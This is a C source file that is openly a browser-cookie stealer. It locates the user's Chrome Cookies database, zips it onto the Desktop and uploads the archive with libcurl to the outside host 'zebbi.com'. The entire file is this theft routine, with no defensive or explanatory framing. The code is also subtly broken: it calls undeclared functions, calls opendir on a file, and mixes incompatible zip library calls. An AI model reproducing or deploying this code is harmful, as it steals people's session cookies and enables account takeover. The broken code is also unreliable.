#include <stdio.h>
#include <unistd.h>
#include <dirent.h>
#include <zip.h>
#include <errno.h>
#include <curl/curl.h>
#include <setjmp.h>

jmp_buf jump_buffer;

int main() {
    if (setjmp(jump_buffer) == 0) {
        char *username = get_username();

        char chrome_path[256];
        sprintf(chrome_path, "/home/%s/.config/google-chrome/Default/Cookies", username);

        DIR* dir = open_directory(chrome_path);
        closedir(dir);

        char zip_path[256];
        sprintf(zip_path, "/home/%s/Desktop/Cookies.zip", username);

        create_zip(chrome_path, zip_path);

        const char* api_url = "zebbi.com";
        send_zip_to_api(zip_path, api_url);
    } else {
        printf("An error occurred while creating or sending the zip file.\n");
    }

    return 0;
}

void handle_error() {
    longjmp(jump_buffer, 1);
}

void create_zip(const char* source_path, const char* zip_path) {
    struct zip_t *zip = zip_open(zip_path, ZIP_CM_DEFAULT, 'w');
    if (zip) {
        zip_entry_open(zip, source_path);
        zip_entry_fwrite(zip, source_path);
        zip_entry_close(zip);
        zip_close(zip);
    } else {
        printf("Failed to create zip file: %s\n", zip_path);
        handle_error();
    }
}

void send_zip_to_api(const char* zip_path, const char* api_url) {
    CURL *curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, api_url);

        struct curl_httppost *formpost=NULL;
        struct curl_httppost *lastptr=NULL;
        curl_formadd(&formpost,
                     &lastptr,
                     CURLFORM_COPYNAME, "file",
                     CURLFORM_FILE, zip_path,
                     CURLFORM_END);

        curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);

        res = curl_easy_perform(curl);

        if(res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            handle_error();
        }

        curl_easy_cleanup(curl);

        curl_formfree(formpost);
    } else {
        handle_error();
    }

    curl_global_cleanup();
}

char* get_username() {
    char *username = getlogin();
    if (username == NULL) {
        perror("getlogin() error");
        exit(-1);
    }
    return username;
}

DIR* open_directory(const char* path) {
    DIR* dir = opendir(path);
    if (dir == NULL) {
        if (ENOENT == errno) {
            printf("Directory does not exist: %s\n", path);
        } else {
            perror("opendir() error");
        }
        exit(-1);
    }
    return dir;
}